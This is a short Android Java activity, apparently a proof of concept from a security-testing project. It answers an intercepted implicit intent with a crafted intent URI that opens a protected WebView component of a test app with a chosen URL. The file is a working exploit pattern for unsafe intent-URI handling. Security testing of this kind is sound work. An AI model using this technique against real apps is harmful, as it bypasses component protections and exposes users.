package sherlock.poc.unsafe_intent_uri.component;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class InterceptImplicitIntentActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setClassName("sherlock.test", "sherlock.test.protected_components.ProtectedWebViewActivity");
        target.putExtra("url", "https://www.netflix.com");

        String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);

        Bundle bundle = new Bundle();
        bundle.putString("url", intentUri);

        Intent i = new Intent();
        i.setData(Uri.parse(intentUri));
        i.putExtra("url", intentUri);
        i.putExtra("bundle", bundle);
        setResult(-1, i);
        finish();
    }
}
